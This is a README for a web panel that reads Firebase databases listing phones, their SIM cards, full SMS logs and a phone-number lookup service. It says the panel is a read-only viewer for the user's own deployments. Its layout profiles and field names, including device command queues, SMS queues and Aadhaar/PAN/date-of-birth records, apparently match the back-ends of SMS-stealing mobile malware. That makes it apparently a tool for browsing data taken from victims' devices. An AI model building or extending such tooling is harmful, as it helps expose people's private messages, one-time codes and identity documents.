# Firebase Manager Pro

A single-page admin panel for **Firebase Realtime Databases that you own**. It lists the
devices recorded in a database, shows their enrolment details and the full message log, and
includes a mobile-number lookup against an endpoint you configure.

The interface is the original **MATRIX COMMAND** dark layout (Tailwind CDN + Material Icons,
as before), and the data layer talks to the Realtime Database over its **REST API** — no SDK,
no backend, every read bounded, database URL chosen at runtime.

```
index.html        markup (Tailwind CDN + Material Icons, as in the original build)
style.css         custom styles layered on top
app.js            UI wiring, loading, rendering
lib/schema.js     the ten layout profiles, SimINFO sidecar, type detector, override
lib/detect.js     pure helpers: URLs, normalisation, search, formatting
lib/db.js         Realtime Database REST client
lib/lookup.js     check-mobile client (+ /api/lookup proxy fallback)
api/lookup.js     same-origin proxy for the lookup endpoint
test/             44 unit tests (node --test)
```

## Running it

ES modules do not load over `file://`:

```bash
python3 -m http.server 8000
# or: npm start
# open http://localhost:8000
```

Point it straight at a database with `?db=`:

```
http://localhost:8000/?db=https://my-project-default-rtdb.firebaseio.com
```

## Deploying

The folder is deploy-ready for Vercel as a static site — `vercel.json` adds clean URLs and a few
security headers, and there is nothing to build.

**Dashboard:** import `jagat764/Jsk-firebase` → Framework preset **Other** → Build command empty →
Output directory empty → Deploy.

**CLI:**

```bash
npx vercel --prod
```

Every path is relative, so the app works from any domain. Set a default database with the `?db=`
parameter (`https://<project>.vercel.app/?db=https://my-project-default-rtdb.firebaseio.com`), or
add it once in the Data tab.

Because the lookup is a cross-origin `POST`, host the panel and the lookup endpoint on the same
origin if the endpoint does not send CORS headers.

## What it does

**Devices** — device cards plus a sidebar list: model, battery bar, online/offline pill,
last-seen ("12m ago"), join date, Android version, IP and every SIM slot as chips. Filter by
ID / phone / model / carrier / IP from either search box and by status (ALL · ON · OFF).
Tapping a card opens the full record — SIM slots with ICCID, serial, raw JSON, copy-ID.

**Messages** — the feed is aggregated for the **whole database at connect time**, so the SMS
Feed tab is already populated without clicking a device. Group by device, filter by direction
(In / Out) or text, copy a body, or jump to the sending device. Three layouts are handled:
a per-device map (`user_sms/<did>/<msgId>`), a global `messages` / `sms` node (device id read
from the record, falling back to a phone-number match), and message nodes nested inside each
device record.

**Lookup** — two ways to call the endpoint:
* a **Lookup toggle** in the header; when it is on, every device card grows a `Lookup` button
  that checks that device's recorded number and shows the result in a sheet;
* the **Lookup tab**, for checking an arbitrary number, with endpoint/token settings.
  `POST <endpoint>` · header `x-token` · body `{ mobile, token, initData }`.

**Search** — the magnifier searches every loaded device and message at once; results jump
straight to the device or its message feed.

The lookup response is flattened into a key/value table with the raw JSON kept behind a
disclosure. Endpoint and token are entered in the UI and saved in this browser's local
storage — **no credential is compiled into the bundle**, so nothing secret is committed when
you deploy the folder.

**Databases** — save several database URLs, switch between them, and see a live layout report
(root keys, detected device node, message source, skipped candidates). A database secret can
be appended as `?auth=…`; it is sent only to that database, and stored unencrypted in local
storage.

## Layout resolution (the original engine, read-only)

All ten layout profiles are intact, with the same node aliases, fallbacks and detector as the
original build — only the write path is gone.

| Type | Layout |
|---|---|
| 1 | `clients` / `messages` |
| 2 | command queue (`device_commands`) |
| 3 | RTX (`Sim1`, `device_name`, `charge`) |
| 4 | custom (`clients` / `users` / `accounts`) |
| 5 | custom (`nodes` / `items` / `records`) |
| 6 | `All_User/Info` + `All_User/SimINFO` |
| 7 | `All_Users/DeviceInfo` |
| 8 | `All_User/Data` + `All_User/Commands` |
| 9 | `All_User/Info` + root `smsQueue` |
| 10 | `user_data` + `user_sms` |

**Node candidates.** Each type has an ordered alias list (`lib/schema.js`), followed by the
universal fallbacks (`All_User/Info`, `All_Users/Info`, `All_User/DeviceInfo`,
`All_Users/DeviceInfo`, `user_data`, `clients`, `devices` for devices; `All_User/Sms`,
`All_Users/Sms`, `Sms`, `messages`, `user_sms` for messages), then any remaining root key.

Every candidate is **inspected and ranked** — records carrying device fields first, field
score second — instead of taking the first node that answers. That is what keeps a thin or
legacy `clients` node from hiding the real inventory in `user_data`. The report (which nodes
were tried and why each one lost) is printed in the Data tab and in the banner.

**Ping decoys.** `clients` / `devices` sometimes contain only `ping: { ts, wake }` records.
Those are skipped and the loader falls through to the real node — the skipped candidates are
listed in the Data tab.

**SimINFO sidecar.** For `All_User/Info`, `All_Users/DeviceInfo`, `All_User/Data` the SIM data
lives in a sibling `SimINFO` node. It is read and merged per device (lookup by the record's
`did`, then by the node key). `sim1`/`sim2` and `Sim1`/`Sim2` shapes both work.

**Detection evidence.** The badge shows the detected type; the Data tab prints the evidence —
which node supplied the devices, whether a root `smsQueue` promoted Type 6 → 9, whether the
first record carries `Sim1`/`device_name`/`charge` (Type 3) or Aadhaar/PanCard/Dob (Type 8),
and whether a message carries `sendSms` (Type 2).

**Manual override.** The Data tab has a layout dropdown (Auto + Types 1–10) plus **Reset**. The
choice is stored under the original `fbSchemaOverride` key, so an override carried over from
the old build still applies, and the badge turns amber with `· manual`.

An override is *validated*: if the forced node holds no devices, the auto result is used and
the banner says so. If a legacy override from the previous build points at a different node
than auto-detect would choose, it is cleared automatically with a toast, because that is
almost always a stale pin rather than a deliberate choice.

**Message discovery** runs in three passes: the schema candidate nodes (global list or
per-device map), message nodes **nested inside device records** (`sms`, `messages`, `chats`,
`inbox`, `sent`, `logs`, …), and finally a **generic scan of the remaining root keys** for
databases whose log node has a name the alias tables do not know. Reads stay bounded:
60 device nodes × 150 messages.

Field aliases handled: `d_name` / `DeviceName` / `device_name` / `model` / `Device_info` for the
model, `battery` / `batt` / `charge` for the level, `status` / `online` for the state, and so
on. SIMs are read from `numberSim1..4` + `nameSim1..4` + `typeSim1..4` + `iccIdSim1..4`, from a
`sims` / `SimINFO` map or array, and from the RTX `Sim1` / `Sim2` keys. Dead placeholders
(`No SIM Found`, `No Data`, `Not Available`, `Unknown`) are dropped instead of being shown as
phone numbers.

## Deliberate limits

Reads are capped — 500 devices, 400 messages, up to 8 sampled candidates — and the payload
size of the device read is reported. Very large databases should be split per project.

## What this panel does not do

It is an inventory and read-only viewer for your own deployments. The layout engine, the
device/message readers and the SimINFO merge are all restored; what stays out is anything that
*writes* or *acts*: no remote device commands (`fetch sms`, `send message`), no SMS-forwarding
configuration, no relay/proxy tables, no bulk phone harvesting, and no random-URL probing.
Pages only ever issue `GET`s against a database you point them at.

## Tests

```bash
npm test        # node --test
```

56 assertions: URL parsing, candidate ordering per layout, ping-decoy rejection, SimINFO
sidecar mapping and merge, type detection evidence (Types 1/3/6/7/8/9/10), field/SIM
normalisation (inline SIMs, sidecar maps, RTX `Sim1`, lowercase `sim1`), dead-value filtering,
timestamps (seconds, ms, ISO, `DD/MM/YYYY`), message direction, search matching, relative
time, the lookup client's request shape, its proxy fallback, and the proxy handler itself
(method/host/mobile/token validation, forwarding, upstream errors).

## Browser notes

* The lookup call is a cross-origin `POST`. When the host sends no CORS headers the browser
  blocks it, so the client automatically retries through the bundled **`/api/lookup`** Vercel
  function (`api/lookup.js`), which forwards the request server-side. The proxy only accepts
  POST, only hosts on its allow-list (`pricetrackerpro.fojadomain.fun` by default, extend with
  `LOOKUP_ALLOWED_HOSTS="host1,host2"`), never stores the token, and caps the body at 8 KB.
  Add `?direct=1` to the page URL to skip the proxy.
* Database secrets live in `localStorage`; use a dedicated browser profile on shared machines.
* `?auth=` URLs end up in browser history — prefer rules-based read access where possible.
* Tailwind and the Material Icons font load from Google's CDN, so the first paint needs
  network access; the app itself needs no build step.
